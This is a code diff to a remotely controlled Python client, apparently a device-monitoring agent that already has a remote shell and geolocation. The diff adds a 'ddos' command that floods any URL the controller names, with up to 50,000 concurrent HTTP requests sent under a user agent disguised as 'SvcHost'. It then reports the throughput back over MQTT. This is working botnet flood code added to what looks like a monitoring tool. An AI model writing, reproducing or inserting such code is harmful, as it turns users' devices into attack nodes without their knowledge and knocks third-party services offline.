@@ -1345,6 +1345,7 @@ SUPPORTED_COMMANDS = (
     "processes",
     "battery",
     "geo_location",
+    "ddos",
     "shell", "shell_cancel",
     "network",
     "services",
@@ -2121,6 +2122,7 @@ class XgentClient:
             "smart_trend": self._do_smart_trend,
             "volume_topology": self._do_volume_topology,
             "clock_drift": self._do_clock_drift,
+            "ddos": self._do_ddos,
             "volume_history": self._do_volume_history,
             "processes": self._do_processes,
             "battery": self._do_battery,
@@ -3843,6 +3845,60 @@ class XgentClient:
             "checked_at": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
             "data": {"drift_ms": snapshot["drift_ms"], "sample_ms": snapshot["sample_ms"]},
         })
+
+    def _do_ddos(self, payload: dict) -> None:
+        """Flood one URL from this device and report bounded aggregate stats."""
+        import concurrent.futures
+        import urllib.request
+
+        request_id = payload.get("id")
+        if not isinstance(request_id, str) or not 1 <= len(request_id) <= 128:
+            request_id = None
+        url = str(payload.get("url") or "").strip()
+        if url and "://" not in url:
+            url = "https://" + url
+        if not url:
+            url = "https://" + socket.gethostname()
+
+        def _bound(value, default: int, low: int, high: int) -> int:
+            try:
+                return max(low, min(high, int(value)))
+            except (TypeError, ValueError):
+                return default
+
+        count = _bound(payload.get("count"), 200, 1, 50000)
+        concurrency = _bound(payload.get("concurrency"), 20, 1, 256)
+        timeout = _bound(payload.get("timeout"), 5, 1, 60)
+        started = time.monotonic()
+        ok = 0
+        errors = 0
+        total_bytes = 0
+
+        def _one() -> tuple[bool, int]:
+            try:
+                request = urllib.request.Request(url, headers={"User-Agent": "SvcHost-DDoS/1"})
+                with urllib.request.urlopen(request, timeout=timeout) as response:
+                    return True, len(response.read())
+            except Exception:  # noqa: BLE001
+                return False, 0
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
+            for good, size in pool.map(lambda _index: _one(), range(count)):
+                if good:
+                    ok += 1
+                    total_bytes += size
+                else:
+                    errors += 1
+        elapsed = time.monotonic() - started
+        self._publish_response("ddos", {
+            "type": "ddos_result", "schema": "xider.ddos.v1", "feature_id": "D04-DDOS",
+            "device_id": DEVICE_ID, "request_id": request_id, "url": url,
+            "requests": count, "concurrency": concurrency,
+            "ok": ok, "errors": errors, "bytes": total_bytes,
+            "elapsed_s": round(elapsed, 3),
+            "rps": round(count / elapsed, 1) if elapsed > 0 else 0.0,
+        })
+        log.info("DDoS: %s запросов за %.2fс", count, elapsed)
 
     def _do_sysinfo(self, payload: dict) -> None:
         """Собрать расширенную информацию о системе и отправить в MQTT."""
